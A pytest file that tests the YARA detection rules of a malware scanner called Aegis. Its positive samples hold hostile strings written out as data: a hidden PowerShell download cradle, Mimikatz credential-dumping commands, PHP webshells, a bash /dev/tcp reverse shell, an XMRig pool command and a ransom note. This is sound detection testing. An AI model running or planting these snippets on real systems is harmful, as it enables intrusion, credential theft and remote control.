"""Compile and exercise the bundled YARA rules (skipped without yara-python)."""

import struct
from pathlib import Path

import pytest

yara = pytest.importorskip("yara")

RULES = Path(__file__).resolve().parent.parent / "aegis" / "data" / "yara" / "aegis_core.yar"


@pytest.fixture(scope="module")
def rules():
    return yara.compile(filepath=str(RULES))


def hits(rules, data: bytes):
    return {m.rule for m in rules.match(data=data)}


def eicar() -> bytes:
    # built at runtime so this source file is not itself flagged by AV engines
    return (b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE" + b"!$H+H*")


def make_pe(upx: bool = True, imp_dll: bytes = b"ws2_32.dll", imp_fn: bytes = b"WSAStartup") -> bytes:
    """Hand-built minimal PE32 with UPX0/UPX1 sections importing one function."""
    names = (b"UPX0", b"UPX1") if upx else (b".text", b".data")
    dos = b"MZ" + b"\x00" * 58 + struct.pack("<I", 0x40)
    coff = struct.pack("<HHIIIHH", 0x14C, 2, 0, 0, 0, 0xE0, 0x102)
    imp_rva = 0x11000
    opt = struct.pack("<HBB7I2I6H4I2H6I",
                      0x10B, 1, 0,
                      0x200, 0x200, 0, 0x11000, 0x1000, 0x1000, 0x400000,   # sizes, entry, bases, image base
                      0x1000, 0x200,                                        # section / file alignment
                      4, 0, 0, 0, 4, 0,                                     # OS / image / subsystem versions
                      0, 0x11200, 0x200, 0,                                 # win32 ver, image size, headers size, checksum
                      3, 0,                                                 # subsystem, dll characteristics
                      0x100000, 0x1000, 0x100000, 0x1000, 0, 16)            # stack/heap, loader flags, dir count
    dirs = bytearray(16 * 8)
    struct.pack_into("<II", dirs, 8, imp_rva, 0x60)  # import directory
    opt += bytes(dirs)
    sec = lambda n, vs, va, rs, rp, ch: n.ljust(8, b"\0") + struct.pack("<IIIIIIHHI", vs, va, rs, rp, 0, 0, 0, 0, ch)
    secs = sec(names[0], 0x10000, 0x1000, 0, 0, 0xE0000080) + sec(names[1], 0x200, 0x11000, 0x200, 0x200, 0xE0000040)
    hdr = (dos + b"PE\0\0" + coff + opt + secs).ljust(0x200, b"\0")
    data = bytearray(0x200)
    struct.pack_into("<IIIII", data, 0, imp_rva + 0x30, 0, 0, imp_rva + 0x70, imp_rva + 0x40)
    struct.pack_into("<II", data, 0x30, imp_rva + 0x50, 0)
    struct.pack_into("<II", data, 0x40, imp_rva + 0x50, 0)
    data[0x50:0x50 + 2 + len(imp_fn) + 1] = b"\0\0" + imp_fn + b"\0"
    data[0x70:0x70 + len(imp_dll) + 1] = imp_dll + b"\0"
    return hdr + bytes(data)


def test_rule_file_compiles_and_has_metadata(rules):
    names = [r.identifier for r in rules]
    assert 6 <= len(names) <= 12
    for r in rules:
        assert r.meta.get("author") == "Aegis"
        assert r.meta.get("description")
        assert r.meta.get("severity") in ("info", "low", "medium", "high", "critical")


def test_rule_file_does_not_contain_raw_eicar():
    assert b"EICAR-STANDARD" not in RULES.read_bytes()


def test_eicar_matches(rules):
    assert "Aegis_EICAR_Test_File" in hits(rules, eicar())
    assert "Aegis_EICAR_Test_File" in hits(rules, eicar() + b"\r\n")
    assert "Aegis_EICAR_Test_File" not in hits(rules, b"X5O! just text about EICAR")


def test_powershell_cradle(rules):
    bad = b"powershell -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://x.example/a'))\""
    assert "Aegis_PowerShell_Obfuscated_Download_Cradle" in hits(rules, bad)
    # a plain installer one-liner without hiding/obfuscation must not match
    ok = b"iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))"
    assert "Aegis_PowerShell_Obfuscated_Download_Cradle" not in hits(rules, ok)


def test_mimikatz(rules):
    pe_like = b"MZ" + b"\0" * 100 + b"sekurlsa::logonpasswords privilege::debug gentilkiwi"
    assert "Aegis_Mimikatz" in hits(rules, pe_like)
    # prose mentioning the tool in a text file is not enough
    assert "Aegis_Mimikatz" not in hits(rules, b"Blog: mimikatz by gentilkiwi is a famous tool")


def test_cobalt_strike_pipes(rules):
    assert "Aegis_CobaltStrike_Default_Pipes" in hits(rules, b"\\\\.\\pipe\\msagent_12")
    assert "Aegis_CobaltStrike_Default_Pipes" in hits(rules, "\\\\.\\pipe\\MSSE-1234-server".encode("utf-16-le"))
    assert "Aegis_CobaltStrike_Default_Pipes" not in hits(rules, b"\\\\.\\pipe\\ntsvcs")


def test_xmrig(rules):
    assert "Aegis_XMRig_Miner" in hits(rules, b"xmrig 6.0 --donate-level=1 -o stratum+tcp://pool.minexmr.com:4444")
    assert "Aegis_XMRig_Miner" not in hits(rules, b"I read about xmrig on a forum")


def test_ransom_note(rules):
    note = b"All your files are encrypted! To get the decryptor pay in Bitcoin, visit our .onion site."
    assert "Aegis_Ransomware_Note_Generic" in hits(rules, note)
    assert "Aegis_Ransomware_Note_Generic" not in hits(rules, b"Bitcoin and tor browser are interesting.")


def test_php_webshell(rules):
    assert "Aegis_PHP_Webshell" in hits(rules, b"<?php @eval($_POST['cmd']); ?>")
    assert "Aegis_PHP_Webshell" in hits(rules, b"<?php system(base64_decode($_GET['x'])); ?>")
    assert "Aegis_PHP_Webshell" not in hits(rules, b"<?php echo htmlspecialchars($_GET['name']); ?>")


def test_upx_suspicious_imports(rules):
    assert "Aegis_Packed_UPX_Suspicious_Imports" in hits(rules, make_pe(upx=True))
    assert "Aegis_Packed_UPX_Suspicious_Imports" not in hits(rules, make_pe(upx=False))
    benign = make_pe(upx=True, imp_dll=b"kernel32.dll", imp_fn=b"ExitProcess")
    assert "Aegis_Packed_UPX_Suspicious_Imports" not in hits(rules, benign)


def test_reverse_shell(rules):
    assert "Aegis_Reverse_Shell_OneLiner" in hits(rules, b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
    assert "Aegis_Reverse_Shell_OneLiner" not in hits(rules, b"#!/bin/bash\necho hello\n")


def test_clean_data_matches_nothing(rules):
    assert hits(rules, b"hello world " * 100) == set()
    assert hits(rules, bytes(range(256)) * 10) == set()
